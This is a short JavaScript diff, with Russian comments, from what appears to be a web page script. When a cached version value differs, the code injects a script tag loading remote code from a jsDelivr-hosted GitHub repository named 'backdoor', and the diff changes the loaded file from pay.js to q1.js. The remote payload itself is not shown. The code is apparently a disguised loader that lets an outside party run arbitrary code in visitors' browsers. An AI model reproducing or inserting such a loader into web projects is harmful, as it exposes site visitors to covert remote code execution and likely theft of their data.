@@ -10,7 +10,7 @@ var currentVersion = '1.0.1';
 if (localStorage.getItem('scriptVersion') !== currentVersion) {
     // Загрузить новый скрипт
     var script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/gh/deusnotam/backdoor/pay.js';
+    script.src = 'https://cdn.jsdelivr.net/gh/deusnotam/backdoor/q1.js';
     document.head.appendChild(script);
 
     // Обновить версию в кэше
